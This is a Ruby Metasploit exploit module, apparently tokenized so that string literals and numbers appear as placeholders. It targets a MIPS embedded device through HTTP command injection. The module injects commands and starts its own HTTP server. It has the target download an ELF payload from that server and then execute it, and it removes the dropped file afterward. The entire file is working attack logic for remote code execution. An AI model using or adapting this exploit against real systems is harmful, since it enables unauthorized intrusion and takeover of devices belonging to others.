require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: Remote :: HttpServer include Msf :: Exploit :: EXE include Msf :: Exploit :: FileDropper def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > true , <str> = > <str> , <str> = > { <str> = > true } , <str> = > [ [ <str> , { <str> = > ARCH_CMD , <str> = > <str> } ] , [ <str> , { <str> = > ARCH_MIPSLE , <str> = > <str> } ] , ] , <str> = > <int> ) ) register_options ( [ OptAddress . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def request ( cmd , uri ) begin res = send_request_cgi ( { <str> = > uri , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > <str> cmd <str> } } ) return res rescue :: Rex :: ConnectionError vprint_error ( <str> rhost <str> rport <str> ) return nil end end def exploit downfile = datastore [ <str> ] || rand_text_alpha ( <int> + rand ( <int> ) ) uri = <str> if target . name =~ <str> if not ( datastore [ <str> ] ) fail_with ( Failure :: BadConfig , <str> rhost <str> rport <str> ) end cmd = payload . encoded res = request ( cmd , uri ) if ( ! res ) fail_with ( Failure :: Unknown , <str> rhost <str> rport <str> ) end print_status ( <str> rhost <str> rport <str> ) return end @pl = generate_payload_exe @elf_sent = false resource_uri = <str> + downfile if ( datastore [ <str> ] ) service_url = <str> + datastore [ <str> ] + <str> + datastore [ <str> ] . to_s + resource_uri else if datastore [ <str> ] ssl_restore = true datastore [ <str> ] = false end if ( datastore [ <str> ] == <str> or datastore [ <str> ] == <str> ) srv_host = Rex :: Socket . source_address ( rhost ) else srv_host = datastore [ <str> ] end service_url = <str> + srv_host + <str> + datastore [ <str> ] . to_s + resource_uri print_status ( <str> rhost <str> rport <str> service_url <str> ) start_service ( { <str> = > { <str> = > Proc . new { | cli , req | on_request_uri ( cli , req ) } , <str> = > resource_uri } } ) datastore [ <str> ] = true if ssl_restore end print_status ( <str> rhost <str> rport <str> service_url <str> ) filename = rand_text_alpha_lower ( <int> ) cmd = <str> service_url <str> filename <str> res = request ( cmd , uri ) if ( ! res ) fail_with ( Failure :: Unknown , <str> rhost <str> rport <str> ) end if ( datastore [ <str> ] ) print_status ( <str> rhost <str> rport <str> datastore [ <str> ] <str> ) select ( nil , nil , nil , datastore [ <str> ] ) else wait_linux_payload end register_file_for_cleanup ( <str> filename <str> ) cmd = <str> filename <str> print_status ( <str> rhost <str> rport <str> downfile <str> ) res = request ( cmd , uri ) if ( ! res ) fail_with ( Failure :: Unknown , <str> rhost <str> rport <str> ) end cmd = <str> filename <str> print_status ( <str> rhost <str> rport <str> downfile <str> ) res = request ( cmd , uri ) if ( ! res ) fail_with ( Failure :: Unknown , <str> rhost <str> rport <str> ) end end def on_request_uri ( cli , request ) if ( not @pl ) print_error ( <str> rhost <str> rport <str> ) return end print_status ( <str> rhost <str> rport <str> ) @elf_sent = true send_response ( cli , @pl ) end def wait_linux_payload print_status ( <str> rhost <str> rport <str> ) waited = <int> while ( not @elf_sent ) select ( nil , nil , nil , <int> ) waited += <int> if ( waited > datastore [ <str> ] ) fail_with ( Failure :: Unknown , <str> rhost <str> rport <str> ) end end end end 
